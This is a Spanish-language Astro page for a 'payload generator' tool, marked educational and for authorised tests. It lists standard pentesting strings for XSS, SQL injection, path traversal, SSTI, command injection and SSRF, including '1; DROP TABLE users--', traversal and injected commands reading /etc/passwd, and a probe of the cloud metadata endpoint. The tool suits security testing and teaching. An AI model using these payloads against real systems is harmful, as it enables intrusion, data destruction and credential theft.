---
import ToolsLayout from "@/layouts/ToolsLayout.astro";
---

<ToolsLayout title="Payloads" description="Generador de payloads de pentesting (educativo)">
  <main class="min-h-0 flex items-center justify-center px-4 py-8">
    <div class="w-full max-w-2xl bg-card border border-border rounded-xl p-6">
      <h1 class="text-2xl font-bold text-foreground mb-4 text-center">Payloads</h1>
      <p class="text-sm text-muted-foreground mb-4 text-center">
        Solo para pruebas autorizadas. Uso educativo.
      </p>
      <select id="cat" class="w-full px-3 py-2 bg-background border border-border rounded-lg text-foreground mb-3">
        <option value="xss">XSS</option>
        <option value="sqli">SQLi</option>
        <option value="lfi">LFI / Path Traversal</option>
        <option value="ssti">SSTI</option>
        <option value="cmd">Command Injection</option>
        <option value="ssrf">SSRF</option>
      </select>
      <textarea id="out" rows="12" readonly class="w-full px-3 py-2 bg-background border border-border rounded-lg text-foreground font-mono text-sm mb-3"></textarea>
      <button id="copy" class="px-3 py-2 bg-secondary text-secondary-foreground rounded-lg">Copiar</button>
    </div>
  </main>
  <script is:inline>
    const payloads = {
      xss: [
        "<script>alert(1)<\\/script>",
        "\"><img src=x onerror=alert(1)>",
        "'><svg/onload=alert(1)>",
        "javascript:alert(1)",
        "<iframe src=javascript:alert(1)>",
      ],
      sqli: [
        "' OR '1'='1",
        "' OR 1=1--",
        "admin'--",
        "' UNION SELECT NULL,NULL--",
        "1; DROP TABLE users--",
      ],
      lfi: [
        "../../etc/passwd",
        "..\\..\\windows\\win.ini",
        "....//....//etc/passwd",
        "/etc/passwd%00",
      ],
      ssti: [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
      ],
      cmd: [
        "; ls",
        "| cat /etc/passwd",
        "&& whoami",
        "`id`",
        "$(id)",
      ],
      ssrf: [
        "http://127.0.0.1",
        "http://localhost",
        "http://[::1]",
        "http://169.254.169.254/latest/meta-data/",
      ],
    };
    const cat = document.getElementById("cat");
    const out = document.getElementById("out");
    function render() {
      out.value = payloads[cat.value].join("\n");
    }
    cat.addEventListener("change", render);
    render();
    document.getElementById("copy").onclick = async () => {
      await navigator.clipboard.writeText(out.value);
      const b = document.getElementById("copy");
      b.textContent = "Copiado";
      setTimeout(() => (b.textContent = "Copiar"), 1500);
    };
  </script>
</ToolsLayout>
